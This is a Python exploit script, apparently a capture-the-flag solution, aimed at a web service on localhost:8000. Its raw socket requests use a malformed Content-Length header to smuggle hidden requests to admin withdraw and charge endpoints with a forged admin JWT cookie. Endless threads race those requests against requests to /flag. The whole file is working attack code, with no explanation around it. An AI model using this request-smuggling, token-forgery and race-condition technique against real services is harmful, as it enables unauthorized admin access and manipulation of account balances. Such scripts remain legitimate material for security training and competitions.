import socket
from threading import Thread
import requests
from time import sleep

url = "http://localhost:8000"

def requestwithdraw():
    s = socket.create_connection(('localhost', 8000))
    s.sendall(b'GET / HTTP/1.1\r\nHost:localhost:8000\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: 307\r\n\r\nGET /admin/withdraw?money=0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1\r\nCookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzYyMzQ3MDl9.a9Z0W-dLMXzBRYw4ytszf6Y92TJMY-6yzz5Wh5gPet8\r\nHost: localhost:8000\r\n\r\n')

    buf = s.recv(1024)
    s.close()

def requestcharge():
    s = socket.create_connection(('localhost', 8000))
    s.sendall(b'GET / HTTP/1.1\r\nHost:localhost:8000\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: 305\r\n\r\nGET /admin/charge?money=0.999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 HTTP/1.1\r\nCookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzYyMzQ3MDl9.a9Z0W-dLMXzBRYw4ytszf6Y92TJMY-6yzz5Wh5gPet8\r\nHost: localhost:8000\r\n\r\n')

    buf = s.recv(1024)
    s.close()

def requestflag():
    try: 
        r = requests.get(url+"/flag", cookies={"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzYyMzQ3MDl9.a9Z0W-dLMXzBRYw4ytszf6Y92TJMY-6yzz5Wh5gPet8"})
        if "Insufficient balance" not in r.text:
            print(r.text)
    except:
        pass

while True:
    Thread(target=requestwithdraw).start()
    Thread(target=requestflag).start()
